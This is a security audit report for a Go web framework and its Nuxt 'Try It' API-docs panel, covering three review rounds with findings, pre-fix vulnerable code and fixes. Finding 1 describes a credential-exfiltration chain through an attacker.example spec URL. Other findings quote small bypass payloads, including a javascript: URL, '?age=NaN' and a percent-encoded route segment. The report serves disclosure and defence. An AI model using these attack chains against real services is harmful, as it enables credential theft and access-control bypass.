# Security Review - muzak

Adversarial ("assume attacker") review of the Muzak Go framework: `framework/`
(the core library) and `panels/openapi/` (the standalone Nuxt "Try It" API docs
UI, currently a work in progress and not yet wired into the framework's own
`/docs` route). Scope covered authentication, middleware, CORS, rate limiting,
client-IP resolution, routing and request dispatch, error handling, logging,
lifecycle management, file uploads, compression, request binding, input
validation, WebSocket, SSE, the built-in OpenAPI docs page, static/frontend
file serving, and the separate Nuxt docs frontend.

Methodology: every subsystem was read in full rather than sampled, cross
checked against its test suite, and verified to still build, vet, lint clean
(`golangci-lint run ./...`) and pass `go test -race ./...` after any fix.
Eight real, exploitable issues were found and fixed. One further issue is
real but not fixed here, with reasoning and a recommended fix given for it.
A handful of lower-severity, already-mitigated, or opt-in-only footguns are
listed for completeness.

---

## Summary

| # | Severity | Finding | Status |
|---|---|---|---|
| 1 | Critical | Cross-origin `?spec=` override in the Nuxt docs UI lets an attacker load a spec they control and silently exfiltrate a saved API credential | Fixed |
| 2 | High | Bearer token / API key / basic-auth password from the "Try It" panel was kept in `localStorage` forever, in plaintext | Fixed |
| 3 | High | Generated code snippets (curl/Python/JS/...) in the "Try It" panel interpolated attacker-influenceable spec data unescaped, so copy-pasting a snippet could run injected shell/script code | Fixed |
| 4 | Medium | `validate.String().URL()` accepted `javascript:`, `data:` and any other scheme as a "valid absolute URL" | Fixed |
| 5 | Medium | `validate.Number()` let NaN and +/-Inf silently satisfy every numeric rule (Min, Max, Between, Positive, Required, ...); a large int64/uint64 also lost precision on every validation pass, not just when a rule changed it | Fixed |
| 6 | Low-Medium | A secret-tagged config field's raw value could leak into a startup error message via a custom `TextUnmarshaler`'s own error text | Fixed |
| 7 | Medium | Rate limiting keyed on the exact client IP lets any client on a rotatable IPv6 /64 (the block size most providers hand out) present a fresh identity on every request | Mitigation added (`IPPrefixTracker`, opt-in); default since the second review (S11) |
| 8 | Medium | WebSocket/SSE concurrent-connection cap was a single global counter with no per-client dimension, so one address could hold the whole process budget | Fixed (`MaxConnectionsPerIP` / `MaxStreamsPerIP`) |
| 9 | Medium | In-memory rate-limit storage's eviction is global, so a high-cardinality custom `Tracker` can be flooded to evict other clients' counters early | Fixed in the second review (S17): the default tracker was affected too |

---

## 1. CRITICAL - Cross-origin OpenAPI spec injection -> credential exfiltration (FIXED)

**Where:** `panels/openapi/app/composables/useOpenApiSpec.ts`

The docs UI loads its OpenAPI document from `config.public.specUrl` (default:
same-origin `/openapi.json`), but a `?spec=` query-string parameter could
override that URL to anything, with no origin check:

```ts
const specUrl = computed(() => {
  const fromQuery = route.query.spec
  return typeof fromQuery === 'string' && fromQuery.length > 0
    ? fromQuery
    : config.public.specUrl
})
```

That document is fetched client-side and rendered directly into the page.
Two other parts of the app trust whatever it says without checking where it
came from: `useTryIt.ts` builds the "Try It" request's destination from
`spec.value.servers[server].url`, a field the loaded document fully controls,
and `useAuth.ts`'s `applyAuth()` unconditionally attaches the visitor's saved
credential to whatever URL and headers were built.

**Exploit chain.** A developer has previously used the real docs site
(`https://api.example.com/docs/`) and saved their production API key in the
"Authorize" modal. An attacker sends them
`https://api.example.com/docs/?spec=https://attacker.example/evil-openapi.json`
- the address bar, TLS certificate and origin are all genuine, so nothing
about the link looks suspicious. The browser fetches the attacker's document
(a permissive CORS header on their own response is all that takes), which
declares `servers: [{ "url": "https://attacker.example/collect" }]` and a
plausible-looking operation. When the victim clicks "Try It", their real,
previously-saved token auto-attaches - it is keyed to the docs origin, not to
which spec is loaded - and is sent straight to the attacker's server. No
credential re-entry is needed. This is also a documentation-spoofing primitive
in its own right: the real domain can be made to display entirely fabricated
endpoints or instructions.

**Fix applied.** `?spec=` is now honored only when it resolves, relative or
absolute, to the page's own origin; anything cross-origin falls back to the
configured default:

```ts
const pageOrigin = useRequestURL().origin
const specUrl = computed(() => {
  const fromQuery = route.query.spec
  return typeof fromQuery === 'string' && fromQuery.length > 0 && isSameOrigin(fromQuery, pageOrigin)
    ? fromQuery
    : config.public.specUrl
})

function isSameOrigin(value: string, pageOrigin: string): boolean {
  try {
    return new URL(value, pageOrigin).origin === pageOrigin
  } catch {
    return false
  }
}
```

`URL(value, pageOrigin)` also rejects a protocol-relative override
(`//attacker.example/...`), since its resolved origin will not match.

Note that the framework's own built-in documentation page (`framework/docs.go`
+ `docs.html`) never had this problem: it serves under a strict
Content-Security-Policy with `connect-src 'self'`, which blocks cross-origin
fetches outright regardless of any query parameter. The vulnerability was
specific to the separately-deployed Nuxt docs application.

---

## 2. HIGH - API credentials persisted forever in plaintext localStorage (FIXED)

**Where:** `panels/openapi/app/composables/usePersisted.ts`,
`useDocsState.ts`, `components/AuthModal.vue`

The "Try It" panel's Authorize modal saves whatever the visitor pastes in -
bearer token, API key, or a basic-auth username and password - through
`usePersisted()`, which mirrored the value into `localStorage` unconditionally.
Unlike `sessionStorage`, `localStorage` has no expiry and survives the browser
being closed and reopened days or weeks later. The modal's own disclosure text
even named the mechanism ("Stored in this browser only (`localStorage`)..."),
so this was a deliberate but underspecified tradeoff rather than an oversight.

The practical risk: any XSS anywhere on the docs origin (including, before
finding 3 below was fixed, the injected-snippet path) can read the credential
back out with a single `localStorage.getItem(...)` call, and so can anyone
with later access to the browser profile or disk on a shared or lent machine,
indefinitely.

**Fix applied.** `usePersisted()` now takes an optional storage backend
(defaulting to `localStorage` for ordinary UI state), and the `auth` field
specifically is backed by `sessionStorage` instead:

```ts
export function usePersisted<T>(key: string, fallback: T, backend: () => Storage = () => localStorage) { ... }

auth: usePersisted<AuthState>('auth', { schemeId: '', token: '', apiKeyName: '', user: '', pass: '' }, () => sessionStorage),
```

This keeps the credential available across a page reload within the same tab
- the convenience the feature exists for - while ensuring it is gone the
moment the tab or browser closes, rather than sitting on disk indefinitely.
The modal's disclosure text was updated to describe the new behavior
accurately.

---

## 3. HIGH - Code-snippet injection in the "Try It" panel's copy-paste examples (FIXED)

**Where:** `panels/openapi/app/utils/codegen.ts`

The panel generates ready-to-paste curl/Python/JavaScript/TypeScript/Go
snippets from the currently loaded operation: its URL, method, headers and
body. Every generator built its snippet by interpolating those values directly
into a string literal with no escaping, e.g. the curl generator:

```ts
const lines = [`curl -X ${r.method} "${r.url}"`]
for (const [k, v] of Object.entries(r.headers)) lines.push(`  -H "${k}: ${v}"`)
if (r.body) lines.push(`  -d '${r.body.replace(/\n\s*/g, ' ')}'`)
```

All of `r.url`, `r.method` and the header names/values are sourced from the
loaded OpenAPI document (its `servers[].url`, parameter names, and security
scheme names) or from a live HTTP response - none of it text this app wrote.
Combined with finding 1 (before it was fixed, a `?spec=` override could point
the page at an attacker-controlled document), an attacker-chosen operation
name or server URL containing a stray `"` or `'` could break out of the
intended string or shell-quoted token in the generated snippet. A developer
who trusts the real docs domain and copy-pastes the "curl example" into their
terminal could end up running injected shell commands; the JS/Python/Go
variants have the equivalent risk for their own syntax.

**Fix applied.** Every generator now quotes through a helper matched to its
target language instead of raw template interpolation: `strLit()`
(`JSON.stringify`, correct for JS/TS/Go/C#/Java/Rust's string escaping),
`shQuote()` (POSIX single-quote escaping, `'` becomes `'\''`, for the curl/
shell snippet), and `singleQuote()` (PHP/Ruby's own single-quote escaping
rules). No user- or spec-derived value reaches a generated snippet
unescaped any more.

This closes the injection path independently of finding 1: even a same-origin
spec with an attacker-influenced field (an operation summary a developer
copy-pasted from an untrusted source into their own spec, for instance) can no
longer break out of a generated snippet.

---

## 4. MEDIUM - `validate.String().URL()` accepted `javascript:`, `data:` and `file:` (FIXED)

**Where:** `framework/validate/string.go`

The URL rule checked only that a value parsed with a scheme and a host:

```go
parsed, err := url.Parse(*value)
if err != nil || parsed.Scheme == "" || parsed.Host == "" {
    return errors.New("must be a valid absolute URL")
}
```

`url.Parse` happily accepts `javascript://x/%0aalert(1)`, `data://text/html,...`
and similar as absolute URLs with a non-empty scheme and host. Any application
using `.URL()` to validate a field it later uses in a redirect, a stored
profile link, an `<a href>`, or a server-side fetch would have that validation
pass for a payload that is not a fetchable web address at all - the exact kind
of input an XSS-via-redirect or open-redirect exploit needs, now bearing the
validator's blessing.

**Fix applied.** The rule now also requires an http or https scheme:

```go
parsed, err := url.Parse(*value)
if err != nil || parsed.Host == "" || !isHTTPScheme(parsed.Scheme) {
    return errors.New("must be a valid absolute http or https URL")
}
```

Tests were extended to cover `javascript://` and `data://` payloads
explicitly, alongside the existing no-host/relative/garbage cases.

---

## 5. MEDIUM - NaN/Infinity bypassed every numeric rule; silent precision loss on large integers (FIXED)

**Where:** `framework/validate/number.go`

Two related bugs in the same `Evaluate` method:

- `strconv.ParseFloat` accepts the literal strings `"NaN"` and `"Inf"` out of a
  path, query, header or form value. Every comparison against NaN is false, so
  a field validated with `Min`, `Max`, `Between`, `Positive`, `Negative` or
  `MultipleOf` treated a NaN input as satisfying all of them simultaneously;
  `Required`'s zero-check (`value == 0`) is also false for NaN, so even a
  required numeric field accepted it as present. A client could send
  `?age=NaN` to a field validated with `Between(18, 120)` and pass.
- The bound value was converted through `float64` and written back on every
  call, not only when a rule actually transformed it (`Clamp` is the only
  transform). Converting an `int64` or `uint64` through `float64` loses
  precision above 2^53; writing that lossy round-trip back into the field even
  when nothing needed to change silently corrupted large IDs and similar
  fields on every request that touched them.

**Fix applied.** NaN and both infinities are rejected up front, before any
rule runs, with a clear message ("must be a finite number"). The value is now
written back only when a transform actually changed it, confining the
unavoidable float64 rounding to the one rule (`Clamp`) that needs it instead
of applying it unconditionally to every numeric field on every request.

---

## 6. LOW-MEDIUM - A secret config field's parse error could echo its raw value (FIXED)

**Where:** `framework/config.go`

When a config value failed to parse, the loader appended the offending raw
text to its error unless the field was tagged secret, in which case the value
was withheld - but this redaction only covered the text `describeBadValue`
itself appended. If the field's type implements `encoding.TextUnmarshaler`
(the mechanism a custom credential type uses), that type's own `UnmarshalText`
error message is free to include the raw value it was given (e.g. `fmt.Errorf("invalid key %q", raw)`
is a completely natural thing for such a type to write), and that error reached
the final message verbatim via `%w` regardless of the secret tag.

**Fix applied.** A secret-tagged field's parse failure is now reported with a
single fixed message ("could not be parsed (value hidden because the field is
marked secret)") before the underlying error is ever formatted into anything,
so a custom type's own error text can no longer carry a credential into a
startup log or crash report.

---

## 7. MEDIUM - Rate limiting by exact IP is bypassable on IPv6 (mitigation added)

**Where:** `framework/ratelimit.go`, `framework/clientip.go`

The default `IPTracker` keys a quota on the client's exact resolved address.
That is the correct, spoof-resistant identity for IPv4, where an address is a
scarce resource. It is a much weaker identity for IPv6: a /64 is the block
size most residential and cloud providers hand a single customer, so a client
holding one can present a different address from that same block on every
request while never leaving space only they control - and each new address is
a completely fresh budget to `IPTracker`, defeating the point of the limiter
for that class of client.

**What was added, and why not a default change.** `IPPrefixTracker(ipv4Bits,
ipv6Bits int)` was added as an explicit, opt-in `Tracker`: it keys on a
configurable prefix of the address rather than the whole of it (e.g. `/32` for
IPv4, collapsing IPv6 addresses to their real `/64` allocation), so every
address in that range shares one budget:

```go
muzak.RateLimitOptions{Tracker: muzak.IPPrefixTracker(32, 64)}
```

This is offered as a tool rather than wired in as the new default, because the
right prefix length is a deployment decision (a `/64` is the common allocation
but not universal, and an application sitting behind its own NAT or VPN
concentrator has a different picture of what "one client" means), and changing
the default tracker's semantics would be a silent behavior change for every
existing deployment. Applications serving IPv6 clients and relying on
per-client rate limiting should adopt `IPPrefixTracker` explicitly.

---

## 8. MEDIUM - WebSocket/SSE connection cap had no per-client dimension (FIXED)

**Where:** `framework/registry.go` (`liveRegistry`), `framework/websocket_route.go`
(`WSOptions`, `acceptWebSocket`), `framework/sse_route.go` (`SSEOptions`,
`acceptSSE`).

The concurrent-connection cap was a single process-wide counter with no
per-client dimension. A WebSocket/SSE handshake needs no `Origin` header at
all to be accepted (correctly so - only a browser sends one, and the origin
check exists to stop browser-based hijacking, not to authenticate a client),
so a single unauthenticated non-browser client could open and hold all 1024
slots, returning 503 to every other client application-wide until it
disconnected.

**Fix applied.** `liveRegistry[T]` gained an optional per-key dimension
alongside its existing process-wide `limit`: a `perKeyLimit`, a map from each
live entry back to the key it was admitted under, and a per-key live count.
`admits`/`add` now take a key and return a new `registryKeyFull` outcome,
distinct from the existing `registryFull`, when that specific key - not the
process as a whole - is already holding as many entries as it may; `remove`
decrements the right key's count symmetrically. The dimension costs nothing
when unused: a key of `""` (what a caller passes when no per-key limit is
configured at all) is never recorded or checked.

Two new options wire this in, following the exact shape and constraints
`MaxConnections`/`MaxStreams` already established: `WSOptions.MaxConnectionsPerIP`
and `SSEOptions.MaxStreamsPerIP`, each defaulting to 64
(`DefaultWSMaxConnectionsPerIP`/`DefaultSSEMaxStreamsPerIP`), a negative value
disabling the check, and - like their process-wide counterparts - refused at
build time if set anywhere other than the application, since the resource
they bound is a client's share of the whole process rather than of one route.
The key is the address `Context.ClientIP()` resolves, the same
spoof-resistant resolution the rate limiter's `IPTracker` already uses, so it
inherits whatever `ClientIPOptions` (trusted proxies) the application has
configured; if the address cannot be resolved while the limit is on, the
handshake/request is refused with a clear, server-side-logged error rather
than being counted anonymously against a shared budget.

64 was chosen as a default because it is far above what a legitimate browser
session needs (dozens of tabs each open to their own connection stay well
under it) and far below the process-wide default of 1024, so a single
misbehaving or attacking address can now take a meaningful slice of the
budget but never all of it; 16 independently-capped addresses would still be
needed to exhaust the default process-wide limit together, turning a
single-source denial of service into something that needs distributed
resources to reproduce.

Verified with new tests covering: the 503-plus-`Retry-After` behavior once
one address's own limit is reached while the process-wide limit still has
room, that a different address is unaffected, the build-time
application-only restriction (including via a router), the negative-disables
resolution helper, and a registry-level unit test isolating the admit/refuse/
remove/re-admit bookkeeping directly. The whole suite, including
`-race`, and `golangci-lint run ./...` were clean afterward.

---

## 9. MEDIUM - Rate-limiter eviction is global, so a high-cardinality custom Tracker can be flooded (FIXED in the second review)

**Where:** `framework/ratelimit_memory.go`, `makeRoom` (around line 211).

The in-memory rate-limit storage is correctly bounded (`MaxEntries`, default
100,000) and, once full, evicts the single globally soonest-to-expire counter
(a min-heap keyed by expiry, with no partitioning by quota or tenant). This is
safe when keyed by the default, spoof-resistant `ClientIP()`. It is not safe if
an application supplies its own `Tracker` keyed on something higher
cardinality and attacker-influenced - the framework's own documentation gives
`"tenant:" + ctx.Header("X-Tenant")` as an example pattern for exactly this
kind of custom tracker. An attacker sending around 100,000 requests each with
a distinct header value gets a fresh, un-throttled counter on every one of
them (a full self-bypass), and once the table saturates, every further attempt
evicts the globally soonest-to-expire entry - which is disproportionately
likely to belong to some other legitimate tenant or IP, silently resetting
their limit early.

**Correction (second review).** The claim below that the default `IPTracker`
is not affected was wrong. It keyed on the exact address, so a client holding
one IPv6 /64 could send the same flood from distinct addresses and evict, for
example, a per-account login counter kept under another quota. Both halves are
now fixed: see S11 and S17 in the second review below.

**Why not fixed here.** The default `IPTracker` is not affected, so nothing
unsafe ships by default; only an application-supplied high-cardinality
`Tracker` triggers this. A "smarter" eviction policy (weighting by quota,
partitioning the table per quota name) changes rate-limiter semantics broadly
enough to deserve its own tests rather than a same-session change to shared
eviction code.

**Recommendation.** Document (README/godoc) that a custom `Tracker` should key
on authenticated, low-cardinality identity wherever possible, and consider
partitioning the expiry heap per quota name so that one quota's flood cannot
evict another quota's counters.

---

## 10. Low / informational

Real observations, but each is either already mitigated, an opt-in-only
footgun requiring an application author to choose the unsafe path, or has no
exploit path today. Listed for completeness.

| # | Finding | Where | Why it is low risk today |
|---|---|---|---|
| 10.1 | Log redaction (`DefaultRedactedKeys`) matches by attribute key only; logging a whole struct or map via `slog.Any("req", obj)` bypasses it, since nested fields never surface as their own key. | `framework/logging.go` | Requires application code to log a raw object containing secrets; framework-level redaction cannot see inside arbitrary application types. |
| 10.2 | Panic values and wrapped error causes are logged verbatim server-side; never sent to the client, since the HTTP response is always the fixed opaque envelope. | `middleware.go` (`Recovery`), `errors.go` (`logCause`) | By design, for debuggability. Only a problem if application code panics or wraps an error with a literal secret in the message text. |
| 10.3 | `muzak.HTML` is written unescaped by design (the same contract as `html/template.HTML`), with no adjacent "safe compose" helper alongside it. | `framework/html.go` | Documented escape hatch; only becomes XSS if a handler interpolates client input into it directly, which the doc comment explicitly warns against. |
| 10.4 | `upload.File.Filename` is raw, client-supplied text with no sanitizing helper offered; `File.Save(path)` writes to whatever path it is given. | `framework/upload.go` | The framework itself never uses `Filename` to build a path, so there is no exploitable path inside the framework, and the doc comment explicitly warns against building one from it. An application doing `file.Save(filepath.Join(dir, file.Filename))` would be vulnerable to `../` traversal; a `SaveAs(dir)`-style helper that generates its own filename would remove the temptation. |
| 10.5 | Response compression is a BREACH-style compression oracle when a route both reflects attacker input and includes a secret in the same compressed response. | `framework/compress.go` | Already documented in-code with the exact mechanism and mitigation advice; inherent to any generic HTTP compression middleware, not fixable generically at this layer. |
| 10.6 | `X-Forwarded-For` trust is all-or-nothing once a peer is listed in `TrustedProxies`: an overly broad CIDR entry (covering address space an attacker can reach directly, not only the real proxy) lets that attacker spoof arbitrary addresses. | `framework/clientip.go` | Not a code bug - opt-in, explicit, scoped trust is required by design, and the zero value trusts nothing. Purely an operator-configuration risk. |
| 10.7 | Setting `RateLimitOptions` storage's `MaxEntries` negative (an explicit, documented opt-out) combined with a high-cardinality tracker reintroduces unbounded memory growth for up to one sweep interval. | `framework/ratelimit_memory.go` | Already labeled unsafe in the doc comment; requires deliberately disabling the bound. |
| 10.8 | No built-in CSRF protection for cookie-authenticated routes. | `framework/middleware.go` (CORS), whole framework | Correct scope: CORS and CSRF are different problems, and Muzak's CORS is deny-by-default. Worth a line in the README for anyone doing cookie-based auth: add CSRF tokens or `SameSite` cookies yourself, since nothing here does it for you. |

---

## 11. What was checked and found solid

Called out because it is directly relevant to how much to trust the rest of
the codebase, and because it names the patterns worth replicating elsewhere.

- **Timing-safe secret comparisons everywhere.** `auth.go`'s `SecureCompare`
  hashes both operands with SHA-256 before `subtle.ConstantTimeCompare`,
  avoiding both a timing leak and a length leak; used consistently by
  `RequireBearerToken`/`RequireHeaderToken`. No `==` comparison of a secret
  exists anywhere in the framework.
- **Only `crypto/rand`, everywhere it matters.** WebSocket frame masking keys,
  CSP nonces, and the docs page's per-response nonce all use `crypto/rand`.
  No use of `math/rand` for anything security-sensitive.
- **CORS is deny-by-default and cannot be misconfigured into wildcard plus
  credentials** - that combination is rejected at application-build time
  (`ErrCORSWildcardCredentials`), and an Origin is only ever reflected after an
  exact allowlist match or a caller-supplied function, never blindly.
- **Client-IP resolution is spoof-resistant by default**: the zero value
  trusts nothing; a forwarding header is only consulted once its immediate
  peer is an explicitly configured trusted proxy, the walk is right-to-left
  (cannot be lied to past a genuine hop), and hop count is capped to prevent
  parsing amplification.
- **Cross-site WebSocket hijacking is properly prevented**: origin checking is
  a default-deny allowlist enforced before the connection is hijacked, with
  same-origin always allowed and an explicit, clearly-documented opt-out for
  the one case (token-only auth) where it is safe to skip.
- **Static and frontend file serving is traversal-safe**: `os.OpenRoot` plus
  `fs.ValidPath` keep a symlink or a `../` segment from ever escaping the
  served directory, and a directory itself is never listed.
- **No SQL, no `os/exec`, no `text/template` anywhere in the framework** -
  there is no injection surface of those classes to find. The one `sha1` use
  (`websocket_route.go`) is the RFC 6455-mandated handshake accept-key
  computation, not a security-sensitive hash choice.
- **DoS defaults are sane**: read/write/idle/header timeouts and
  request/upload/file size caps all default to sane non-zero values, with an
  explicit comment on every one naming the slow-loris-style attack it exists
  to stop.
- **WebSocket/SSE per-message handling resists memory exhaustion**: a frame's
  declared length is never trusted for a single allocation - payloads are read
  and grown in bounded chunks - and a message's true size is checked against
  the connection's read limit as it arrives, not after the fact. (The check
  itself could overflow; see S1 in the second review.)
- **Panics never reach the client.** Both the HTTP and WebSocket/SSE recovery
  paths log the panic value and stack server-side only and always respond with
  the fixed, opaque error envelope.
- **Rate limiter internals are race-free**: check-then-increment is fully
  mutex-serialized, and the in-memory table is bounded with eviction rather
  than growing without limit (see finding 9 for the one caveat, which the
  second review found did not in fact need an
  application-supplied unsafe tracker to matter).
- **No JWT implementation** exists (only static shared-secret bearer/header
  guards), so the usual algorithm-confusion or missing-expiry JWT bug classes
  do not apply here.
- **No mass-assignment risk** (wrong for two struct shapes; see S3 in the
  second review): reflection-based request binding only ever
  touches exported fields, and JSON body decoding is structurally prevented
  from overwriting a field bound from the path, query or a header, even for an
  embedded struct that mixes both kinds of field.
- **Go's `regexp` package is RE2-based**, so even a `Matches()` rule built
  from a pattern the application author chose poorly cannot suffer
  catastrophic backtracking; ReDoS is not a reachable bug class here.
- **The Nuxt docs frontend's own syntax highlighters HTML-escape before
  wrapping in markup** (both `hi()` and Shiki's `codeToHtml`), so its `v-html`
  usages for request/response bodies and code samples do not introduce XSS on
  their own, and the one place a spec-derived path is rendered as markup
  (`prettyPath`) escapes it first as well.

---

## Second review - 2026-09-28

A second adversarial pass, scoped to the framework module alone and to what
an attacker can do to a service built on it. It read every subsystem again
and required each finding to be reproduced with a test against the framework
before it counted; each of those tests is now a regression test beside the
fix. Two entries in section 11 above turned out not to hold, and finding 9's
reasoning was wrong; all three are annotated where they appear.

The CHANGELOG's Unreleased section describes every fix, and every default it
tightens, with a migration.

| # | Severity | Finding | Default config? | Status |
|---|---|---|---|---|
| S1 | High | WebSocket read-limit check overflowed: a 1-byte frame then a continuation declaring 2^63-1 bytes passed the check, so one unauthenticated connection could buffer until the process ran out of memory (256 MiB sent grew the heap to 747 MiB with a 1 MiB limit) | Yes | Fixed |
| S2 | High | A static route was matched on the escaped segment, so `/users/%61dmin` skipped a guarded `/users/admin` and reached a public `/users/{id}` with `id=admin` | Yes | Fixed |
| S3 | High | Location tags inside an embedded `*T` or a named nested struct were ignored, so the body could set a field meant to come from a gateway header (mass assignment) | Yes | Fixed (build error) |
| S4 | High | `Slice().Unique()` was quadratic: a 228 KB body cost 24 s of CPU, and a later `MaxItems` did not bound it | Yes | Fixed |
| S5 | Medium | Frontend and Static mounts ran guards but not `Needs` providers or rate limits, so a router authenticated by a provider served its files publicly | Yes | Fixed |
| S6 | Medium | An inner `Needs[T]` removed an outer `Needs[T]` of the same type, so an admin check declared at `Include` never ran | Yes | Fixed |
| S7 | Medium | A custom `StatusCoder` rendered the whole wrapped error chain to the client, 5xx included | Yes | Fixed |
| S8 | Medium | A singleton cached a panic or a cancellation error forever, so one aborted first request could fail every later one | Yes | Fixed; its fix regressed, see T5 |
| S9 | Medium | The binder accepted `NaN`/`Inf` for float query, path, header, cookie and form fields (finding 5 fixed only `validate.Number`) | Yes | Fixed |
| S10 | Medium | `IP()`/`IPv6()` accepted any text as a zone, CRLF and markup included | Yes | Fixed |
| S11 | Medium | The per-client WebSocket/SSE caps and the default tracker counted an IPv6 client per address, so one /64 had unlimited allowance | Yes | Fixed (/64) |
| S12 | Low | `/openapi.json` and the docs UI were served before any application-wide guard | Yes | Fixed; its fix regressed, see T4 |
| S13 | Low | A JSON route accepted a body with no Content-Type, enabling cross-site POSTs without a preflight | Yes | Fixed (415) |
| S14 | Low | The console log format wrote request-controlled CR, LF and terminal escapes raw | TTY stderr | Fixed |
| S15 | Low | A failure after the response started ended it cleanly, so a truncated body looked complete | Yes | Fixed (abort) |
| S16 | Low | A panic below `Compress` became an empty 200 | With `Compress` | Fixed |
| S17 | Low | In-memory rate-limit eviction was global, so an IPv6 flood under the default tracker reset another quota's counters (finding 9) | Yes | Fixed |
| S18 | Low | CORS omitted `Vary: Origin` for missing or denied origins | With CORS | Fixed |
| S19 | Low | Frontend and Static served dotfiles (`/.env`, `/.git/config`) | Yes | Fixed (opt-in) |
| S20 | Low | `WSDial` connections ignored `ReadTimeout` and `WriteTimeout` | Client side | Fixed |
| S21 | Low | `Email()` accepted bidi, zero-width and control characters | Yes | Fixed |
| S22 | Low | On a case-insensitive filesystem, `/ADMIN/x` was served by a public parent mount instead of a guarded `/admin` mount | macOS, Windows | Fixed |
| S23 | Low | A locale chosen by header or cookie added only `Vary: Accept-Language` | With those sources | Fixed |
| S24 | Low | An env file parse error echoed the offending line, which could hold a secret | Yes | Fixed |
| S25 | Low | A path that is not valid UTF-8 turned its 404 into a 500 | Yes | Fixed |
| S26 | Info | `json:"-"` on a located field silently disabled its location binding | Yes | Fixed |

**Checked and found solid in this pass:** traversal and symlink escape in file
serving, open redirects, auto-HEAD and auto-OPTIONS guard handling, hidden
routes staying out of the spec, context pooling across requests, WebSocket
origin policy, handshake validation, frame masking, control-frame and UTF-8
rules, SSE field injection, the trusted-proxy walk and `X-Forwarded-For`
spoofing, request-ID injection, CORS origin matching, bearer parsing and
constant-time comparison, duplicate and case-folded JSON keys, integer
overflow in binding, and multipart limits.

**Residual.** `Unique` over element types that are not hashable (`[]*T`,
`[]any`, nested slices) is still quadratic and should carry a `MaxItems`
bound, as its documentation now says. The case check between mounts does not
cover Unicode normalization on volumes that fold composed and decomposed
accents.

---

## Third review - 2026-09-29

A third pass, organised by class of weakness rather than by subsystem: the
second review's own fixes, HTTP protocol handling, resource exhaustion,
secrets and credentials, information disclosure and caching, and concurrency
and lifecycle. As before, each finding was reproduced with a test before it
counted, and each test is now a regression test beside its fix.

Two findings are regressions introduced by the second review's fixes: T4
(from S12, the docs gained the application's guards but not its rate limit)
and T5 (from S8, a failing singleton was no longer cached, but its waiters
then retried one at a time). Both are fixed.

| # | Severity | Finding | Default config? | Status |
|---|---|---|---|---|
| T1 | High | Validation details were unbounded: `Each` or per-element `Nested` reported every failing element, so a 1 MiB body produced a 22 MB 422 and 559 MiB of allocation | Yes | Fixed (100-failure cap) |
| T2 | High | Recursive `Nested` built paths eagerly at every level: a 100 KB body produced a 300 MB 422, 6.9 GB of allocation, and the pooled validator kept the tree | Recursive models | Fixed (32-level limit, lazy paths) |
| T3 | High | A late SSE send could write into a response net/http had recycled, crashing the process or writing into another request on the connection | Yes | Fixed |
| T4 | Medium | The docs ran the application's guards but not its rate limit, so `/openapi.json` was an unlimited oracle for guessing the token (regression from S12) | With app guards | Fixed |
| T5 | Medium | A slowly failing singleton made every waiting request retry in turn under a lock, ignoring cancellation (regression from S8) | Yes | Fixed (single-flight) |
| T6 | Medium | Static served extension-less uploads as `text/html` and SVG inline: stored XSS on the API origin | Uploads under Static | Fixed (no sniffing, CSP sandbox) |
| T7 | Medium | Error responses kept the handler's success headers, so reflected input went out as `text/html` and could be cached publicly | Yes | Fixed |
| T8 | Medium | Guarded routes and mounts sent no Cache-Control, so a shared cache could serve one user's response to another | Yes | Fixed |
| T9 | Medium | 422 details echoed client values and raw parser errors (5-10x amplification), and urlencoded forms were read up to 32 MiB | Yes | Fixed |
| T10 | Medium | A malformed multipart header was logged whole at ERROR: a 1 MiB request wrote a 5 MB log line | Yes | Fixed |
| T11 | Medium | Multipart temp files leaked when a guard or handler parsed the form itself | Yes | Fixed |
| T12 | Medium | `Timezone()` cached every accepted spelling forever and re-read the zone database on every miss | Yes | Fixed |
| T13 | Low | Shutdown took up to three times `ShutdownTimeout`, and lifecycle `Stop` had no deadline and ran under live handlers | Yes | Fixed (one deadline) |
| T14 | Low | One home IPv6 /56 could take every WebSocket/SSE slot, with no way to widen the per-client key | Yes | Fixed (/56, configurable) |
| T15 | Low | Log redaction skipped group-valued keys (`slog.Group`, `LogValuer`, `WithGroup`) | Yes | Fixed |
| T16 | Low | Log redaction matched whole keys only, so `db_password`, `X-Api-Key` and `jwt` were logged | Yes | Fixed |
| T17 | Low | `SSEDial` followed redirects, sending credentials to another host or over plain HTTP | Client side | Fixed |
| T18 | Low | `secret:"true"` on an embedded config struct was ignored | Yes | Fixed |
| T19 | Low | The SPA fallback answered HTML or JSON by Accept without `Vary: Accept` | With a fallback | Fixed |
| T20 | Low | Header and media-type versioning chose a handler by header without `Vary` | Non-URI versioning | Fixed |
| T21 | Low | A shutdown requested during start-up was lost and the server came up | Yes | Fixed |
| T22 | Low | Configuration after an implicit build (`Document`, `ServeHTTP`) was silently dropped, so a late guard left routes open | Yes | Fixed (panics) |
| T23 | Low | A raw non-ASCII path was written to the 404 and the logs at 3-4 times its size | Yes | Fixed (1 KiB) |
| T24 | Low | On Windows an 8.3 short name (`/ENV~1`) bypassed the dotfile block | Windows | Fixed (untested on Windows) |
| T25 | Low | SSE keepalives and WebSocket pong checks used the wall clock | Yes | Fixed |
| T26 | Low | A WebSocket handler's context outlived its connection, so a handler waiting on it outlived its peer and the server's close at shutdown | Yes | Fixed |
| T27 | Bug | A 103 Early Hints swallowed the response after it | Yes | Fixed |

**Checked and found solid in this pass:** the second review's routing decode
against double encoding, mixed-case hex, NUL, encoded dots and long segments;
the dotfile and case checks (except T24); Content-Type enforcement edge cases;
the unreachable-location-tag check across embedded pointers, aliases,
recursion and inline fields; context pool isolation under load with the race
detector; exact rate-limit admission under concurrency; bearer and header
token comparison; request ID generation and trust; cookies; randomness; server
timeouts and TLS defaults; redirects; query parsing agreement between guards
and the binder; and linear cost for every string rule on megabyte inputs.

**Residual.**
- A handler that ignores both its context and its connection, for example one
  blocked on a channel, can still be running when lifecycle `Stop` is called
  at the end of shutdown; it is logged and documented on `App.Shutdown`.
- A guard or handler that parses a form itself through `ctx.Request()` uses
  net/http's own limits (32 MiB in memory and unbounded spill to disk for
  multipart), not the route's; this is documented on `Context.Request`, since
  capping every raw body would break streaming uploads.
- `validate.SliceRules.Evaluate` remains unbounded for callers using the
  validate package directly; `EvaluateUpTo` is the bounded form.
- The Windows short-name check (T24) is exercised by tests on every OS, but has
  not been run on Windows.

---

## One caveat about this review's process

Part of this audit was carried out by several parallel review agents, one per
subsystem. All of their concrete findings and fixes were independently
re-verified by hand against the actual source before being written up here
(and the whole framework module was rebuilt, vetted and re-tested afterward),
so nothing above is taken on faith from an agent's own summary. Readers of
this file do not need to know that to trust it; it is noted only for
transparency about how the review was conducted.
